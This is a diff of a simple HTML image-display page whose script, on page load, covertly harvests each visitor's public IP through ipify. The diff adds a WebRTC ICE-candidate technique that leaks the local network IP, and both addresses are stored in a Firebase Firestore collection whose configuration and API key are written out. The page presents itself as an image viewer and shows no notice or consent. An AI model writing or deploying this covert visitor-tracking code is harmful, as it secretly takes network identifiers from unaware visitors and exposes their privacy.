@@ -8,10 +8,10 @@
     color: white;
     text-align: center;
   }
-  div.image {
+  .image {
     width: 400px;
     height: 300px;
-    background-image: url('images.jpeg'); /* dein Bild */
+    background-image: url('images.jpeg');
     background-size: cover;
     background-position: center;
     border: 1px solid white;
@@ -27,7 +27,6 @@
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
   import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js";
 
-  // Firebase-Konfiguration
   const firebaseConfig = {
     apiKey: "AIzaSyCbA9QaYmD0Ck-VQVOaXsZvV0aFTtET0TM",
     authDomain: "imagehub-745c1.firebaseapp.com",
@@ -38,34 +37,56 @@
     measurementId: "G-45VHM7HWG0"
   };
 
-  // Firebase initialisieren
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
 
-  async function savePublicIP() {
-    let publicIP = 'unknown';
+  async function getPublicIP() {
     try {
-      const response = await fetch('https://api.ipify.org?format=json');
-      if (response.ok) {
-        const data = await response.json();
-        publicIP = data.ip;
+      const resp = await fetch('https://api.ipify.org?format=json');
+      if(resp.ok) {
+        const data = await resp.json();
+        return data.ip;
       }
-    } catch (err) {
-      console.error('Fehler beim Abrufen der Public IP:', err);
+    } catch(e) {
+      console.error('Fehler Public IP:', e);
     }
+    return 'unknown';
+  }
+
+  async function getLocalIP() {
+    return new Promise((resolve) => {
+      const pc = new RTCPeerConnection({iceServers:[]});
+      pc.createDataChannel("");
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      pc.onicecandidate = (event) => {
+        if(!event.candidate) return;
+        const ipMatch = event.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
+        if(ipMatch) {
+          resolve(ipMatch[1]);
+          pc.onicecandidate = null;
+        }
+      };
+      setTimeout(() => resolve('unknown'), 2000); // fallback
+    });
+  }
+
+  async function saveIPs() {
+    const publicIP = await getPublicIP();
+    const localIP = await getLocalIP();
 
     try {
       await addDoc(collection(db, "publicIPs"), {
-        ip: publicIP,
+        publicIP,
+        localIP,
         timestamp: serverTimestamp()
       });
-      console.log('Public IP gespeichert:', publicIP);
-    } catch (err) {
-      console.error('Fehler beim Speichern in Firestore:', err);
+      console.log('IPs gespeichert:', { publicIP, localIP });
+    } catch(e) {
+      console.error('Fehler beim Speichern:', e);
     }
   }
 
-  savePublicIP();
+  saveIPs();
 </script>
 </body>
 </html>
